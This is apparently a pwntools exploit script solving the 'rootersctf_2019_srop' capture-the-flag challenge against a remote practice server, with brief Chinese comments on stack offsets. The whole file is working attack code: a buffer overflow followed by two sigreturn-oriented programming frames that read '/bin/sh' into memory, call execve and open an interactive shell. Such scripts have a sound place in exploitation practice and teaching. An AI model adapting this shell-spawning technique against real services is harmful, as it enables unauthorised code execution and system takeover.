from pwn import *
context(os='linux', arch='amd64', log_level='debug')
elf = ELF('./rootersctf_2019_srop')
# io = process('./rootersctf_2019_srop')
io = remote('node4.buuoj.cn',27818)

syscall_leave_ret = 0x401033
pop_rax_syscall_leave_ret = 0x401032
syscall_addr = 0x401046
data_addr = 0x402000

frame = SigreturnFrame(kernel='amd64')
frame.rax = constants.SYS_read #就是0
frame.rdi = 0 #stdin
frame.rsi = data_addr
frame.rdx = 0x400
frame.rip = syscall_leave_ret
frame.rbp = data_addr + 0x20
#leave -> mov rsp,rbp;pop rbp
payload = flat([0x88 * b"a", pop_rax_syscall_leave_ret, 0xf, frame])
# srop to call read, set *data_addr = /bin/sh\x00
io.sendlineafter(b"Hey, can i get some feedback for the CTF?\n", payload)


frame = SigreturnFrame(kernel='amd64')
frame.rax = constants.SYS_execve#59
frame.rdi = data_addr
frame.rsi = 0
frame.rdx = 0
frame.rip = syscall_addr
#注意这里的b'a'只设置了0x20，而非bin_sh加上b'a'一共0x20，是因为leave中还有个pop rbp会导致要增加0x8的无用数据空间
#这里正好利用这个空间来设置binsh
payload = flat([b'/bin/sh\x00', 0x20 * b"a", pop_rax_syscall_leave_ret, 0xf, frame])
io.sendline(payload)

io.interactive()
